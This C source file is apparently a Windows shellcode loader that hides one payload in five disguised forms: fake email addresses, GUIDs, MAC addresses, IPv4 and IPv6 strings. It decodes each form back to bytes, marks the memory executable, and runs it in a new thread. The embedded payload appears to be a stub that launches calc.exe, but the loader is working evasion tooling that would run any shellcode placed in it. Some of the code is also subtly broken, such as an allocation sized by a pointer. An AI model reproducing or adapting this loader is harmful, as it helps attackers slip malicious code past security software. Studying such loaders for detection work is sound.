#include <Windows.h>

#include <string.h>
#include <stdio.h>
#include <errno.h>

#include "obfuscation/email2byte.h"
#include "obfuscation/uuid2byte.h"
#include "obfuscation/mac2byte.h"
#include "obfuscation/ip2byte.h"


// =======  Constants  ===================================================== //

const unsigned char *buf_email[] = {
	"meike.r.hofinger316@protonmail.co", "estrella.a.rivera16@aol.cn",
	"yael.a.hendricks85@comcast.co", "alex.e.schutz34@virginmedia.br",
	"friedo.r.cuesta134@outlook.co", "irmhild.e.hentschel34@charter.br",
	"adela.q.sales466@comcast.es", "constanca.d.villaverde12@qq.com",
	"renan.y.zorrilla256@rediffmail.uk", "benicio.d.north67@aol.net",
	"mercedes.d.mary340@comcast.net", "gudula.r.cuesta136@live.de",
	"kathi.y.carocci116@live.de", "pascal.q.rivera0@outlook.co",
	"marialuz.a.marrero466@gmail.net", "sven.b.lubs6@outlook.xyz",
	"jafet.a.hentschel64@qq.jp", "jackson.m.manrique498@aol.net", "ross.j.elorza0@qq.in",
	"constanca.d.villaverde12@qq.com", "ajla.d.north67@aol.net",
	"mercedes.c.bohnbach29@mailru.cn", "louisa.g.bonatti258@outlook.info",
	"eugenia.c.paruta22@outlook.xyz", "jafet.a.schuster64@qq.jp",
	"marius.d.filangieri274@outlook.xyz", "jafet.a.leao64@qq.jp",
	"henrique.w.pina18@gmail.net", "leona.c.pou86@outlook.cloud", "piero.u.collet16@aol.be",
	"yael.u.wild251@yahoo.com", "yael.f.robledo22@outlook.net", "piero.u.gianetti196@att.biz",
	"torsten.ad.montana471@aol.co", "kayleigh.c.rivera0@gmail.com",
	"ortrun.a.izaguirre35@gmx.fr", "mary.c.rivera16@web.se",
	"kornelius.w.mazzocchi511@rambler.ru", "gerda.a.powell130@comcast.net",
	"hiltrud.n.lam359@mailru.online", "concha.r.ceschi266@yahoo.eu",
	"ivan.y.dixon62@libero.com", "leszek.l.valle452@charter.br", "magda.u.amaral80@gmx.biz",
	"yannis.ad.valladares216@msn.uk", "teofilo.rc.durante25@zoho.com",
	"christine.m.blanchet385@naver.io"
};

const unsigned char *buf_guid[] = {
	"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52",
	"728B4820-4850-B70F-4A4A-4D31C94831C0", "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
	"48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",
	"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1",
	"F175E038-034C-244C-0845-39D175D85844", "4924408B-D001-4166-8B0C-48448B401C49",
	"8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",
	"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B",
	"D5FF876F-E0BB-2A1D-0A41-BAA695BD9DFF", "C48348D5-3C28-7C06-0A80-FBE07505BB47",
	"6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-0C0C-0C0C-0C0C-0C0C0C0C0C0C"
};

const unsigned char *buf_mac[] = {
	"FC:48:83:E4:F0:E8", "C0:00:00:00:41:51", "41:50:52:51:56:48", "31:D2:65:48:8B:52",
	"60:48:8B:52:18:48", "8B:52:20:48:8B:72", "50:48:0F:B7:4A:4A", "4D:31:C9:48:31:C0",
	"AC:3C:61:7C:02:2C", "20:41:C1:C9:0D:41", "01:C1:E2:ED:52:41", "51:48:8B:52:20:8B",
	"42:3C:48:01:D0:8B", "80:88:00:00:00:48", "85:C0:74:67:48:01", "D0:50:8B:48:18:44",
	"8B:40:20:49:01:D0", "E3:56:48:FF:C9:41", "8B:34:88:48:01:D6", "4D:31:C9:48:31:C0",
	"AC:41:C1:C9:0D:41", "01:C1:38:E0:75:F1", "4C:03:4C:24:08:45", "39:D1:75:D8:58:44",
	"8B:40:24:49:01:D0", "66:41:8B:0C:48:44", "8B:40:1C:49:01:D0", "41:8B:04:88:48:01",
	"D0:41:58:41:58:5E", "59:5A:41:58:41:59", "41:5A:48:83:EC:20", "41:52:FF:E0:58:41",
	"59:5A:48:8B:12:E9", "57:FF:FF:FF:5D:48", "BA:01:00:00:00:00", "00:00:00:48:8D:8D",
	"01:01:00:00:41:BA", "31:8B:6F:87:FF:D5", "BB:E0:1D:2A:0A:41", "BA:A6:95:BD:9D:FF",
	"D5:48:83:C4:28:3C", "06:7C:0A:80:FB:E0", "75:05:BB:47:13:72", "6F:6A:00:59:41:89",
	"DA:FF:D5:63:61:6C", "63:2E:65:78:65:00", "06:06:06:06:06:06"
};

const unsigned char *buf_ipv4[] = {
	"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210",
	"101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183",
	"74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65",
	"1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136",
	"0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73",
	"1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192",
	"172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209",
	"117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73",
	"1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89",
	"65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255",
	"255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",
	"111.135.255.213", "187.224.29.42", "10.65.186.166", "149.189.157.255", "213.72.131.196",
	"40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137",
	"218.255.213.99", "97.108.99.46", "101.120.101.0", "4.4.4.4"
};

const unsigned char *buf_ipv6[] = {
	"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52",
	"2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0", "AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED",
	"5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
	"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1",
	"38E0:75F1:4C03:4C24:0845:39D1:75D8:5844", "8B40:2449:01D0:6641:8B0C:4844:8B40:1C49",
	"01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
	"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B",
	"6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF", "D548:83C4:283C:067C:0A80:FBE0:7505:BB47",
	"1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:0C0C:0C0C:0C0C:0C0C:0C0C:0C0C"
};

#define LEN_BUF_EMAIL (sizeof(buf_email)/sizeof(buf_email[0]))
#define LEN_BUF_GUID  (sizeof(buf_guid)/sizeof(buf_guid[0]))
#define LEN_BUF_MAC	  (sizeof(buf_mac)/sizeof(buf_mac[0]))
#define LEN_BUF_IPV4  (sizeof(buf_ipv4)/sizeof(buf_ipv4[0]))
#define LEN_BUF_IPV6  (sizeof(buf_ipv6)/sizeof(buf_ipv6[0]))

typedef struct {
	enum { FUNC_3, FUNC_4 } type; // Tells which func to use
	union {
		DWORD (*fn3)(IN PCSTR, OUT PCSTR*, OUT PBYTE);
		DWORD (*fn4)(IN PCSTR, IN BOOL, OUT PCSTR*, OUT PBYTE);
	};
	BOOL boolParam;
} TaggedFn;


// =======  Helpers  ======================================================= //

static BOOL UnpadBuffer(
	IN PVOID data,
	IN SIZE_T dataSize,
	OUT PVOID* dataOut,
	OUT PSIZE_T dataOutSize
) {
	int padding = ((unsigned char*)data)[dataSize - 1];
	*dataOutSize = dataSize - padding;

	*dataOut = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *dataOutSize);
	if (*dataOut == NULL) {
		printf("[-] Error allocating output buffer: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(*dataOut, data, *dataOutSize);
	return TRUE;
}

static int RunPayload(
	IN unsigned char *Buf[],
	IN size_t BufCount,
	IN size_t ElementSize,
	IN TaggedFn fn
) {
	printf("[*] Deobfuscating payload...\n");

	SIZE_T sDeobfuscatedSize = BufCount * ElementSize; // ElementSize bytes per element
	PBYTE pDeobfuscatedPayload = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sDeobfuscatedSize);
	if (pDeobfuscatedPayload == NULL) {
		printf("[-] HeapAlloc failed with error: %d\n", GetLastError());
		return -1;
	}

	PCSTR *pReadPtr = Buf;
	PBYTE pWritePtr = pDeobfuscatedPayload;
	while (pReadPtr < Buf + BufCount) {
		PCSTR Terminator = NULL;
		DWORD status;
		if (fn.type == FUNC_3) {
			status = fn.fn3((PCSTR)*pReadPtr, &Terminator, pWritePtr);
		} else {
			status = fn.fn4((PCSTR)*pReadPtr, fn.boolParam, &Terminator, pWritePtr);
		}

		if (status != ERROR_SUCCESS) {
			printf("[-] Something went wrong with %s while deobfuscating: %d\n", *pReadPtr, status);
			return -1;
		}

		pWritePtr += ElementSize;
		pReadPtr++;
	}

	memset(Buf, '\0', sizeof(Buf));

	PBYTE pPayload = NULL;
	SIZE_T sPayloadSize = 0;
	if (!UnpadBuffer(pDeobfuscatedPayload, sDeobfuscatedSize, &pPayload, &sPayloadSize)) {
		printf("[-] Error while unpadding deobfuscated buffer");
		return -1;
	}
	HeapFree(GetProcessHeap(), NULL, pDeobfuscatedPayload);

	// --- Payload Deobfuscated --- //

	PVOID pShellCodeAddress = VirtualAlloc(NULL, sizeof(Buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellCodeAddress == NULL) {
		printf("[-] VirtualAlloc failed with error: %d\n", GetLastError());
		return -1;
	}

	printf("[+] Allocated memory at: 0x%p\n", pShellCodeAddress);

	memcpy(pShellCodeAddress, pPayload, sPayloadSize);
	memset(pPayload, '\0', sPayloadSize);
	HeapFree(GetProcessHeap(), NULL, pPayload);

	DWORD dwOldProtection = NULL;
	if (!VirtualProtect(pShellCodeAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[-] VirtualProtect failed with error: %d\n", GetLastError());
		return -1;
	}

	printf("[*] Running shelcode in a separate thread...\n");
	HANDLE thread;
	if ((thread = CreateThread(NULL, NULL, pShellCodeAddress, NULL, NULL, NULL)) == NULL) {
		printf("[-] CreateThread failed with error: %d\n", GetLastError());
		return -1;
	}

	// Wait for a minute tops
	DWORD value = 0;
	if ((value = WaitForSingleObject(thread, 1 * 60 * 1000)) != WAIT_OBJECT_0) {
		printf("[-] Thread exited with an unknown state: %d\n", value);
		return -1;
	}

	return 0;
}

// =======  Entrypoint  ==================================================== //

int main(int argc, char *argv[]) {
	typedef struct {
		const unsigned char *name;
		const unsigned char *buf;
		size_t bufLen;
		size_t elementSize;
		TaggedFn fn;
	} OBFUSCATION_RULE;

	OBFUSCATION_RULE rules[5] = {
		{ "email", buf_email, LEN_BUF_EMAIL, 6  , {FUNC_3, EmailStringToBytes,		FALSE }},
		{ "GUID",  buf_guid,  LEN_BUF_GUID,  16 , {FUNC_4, UUIDFromString,			TRUE  }},
		{ "MAC",   buf_mac,   LEN_BUF_MAC,   6  , {FUNC_3, EthernetStringToAddress, FALSE }},
		{ "IPv4",  buf_ipv4,  LEN_BUF_IPV4,  4  , {FUNC_4, Ipv4StringToAddress,		TRUE  }},
		{ "IPv6",  buf_ipv6,  LEN_BUF_IPV6,  16 , {FUNC_3, Ipv6StringToAddress,		FALSE }},
	};

	for (size_t i = 0; i < 5; i++) {
		printf("[*] START running %s payload...\n", rules[i].name);
		if (RunPayload(rules[i].buf, rules[i].bufLen, rules[i].elementSize, rules[i].fn) != 0) {
			printf("[-] Processing failed, moving on\n");
			continue;
		}
		printf("[*] END running %s payload...\n", rules[i].name);
		
		if (i < 4) {
			printf("[#] Press Enter continue with the next...\n");
			getchar();
		}
	}

	return 0;
}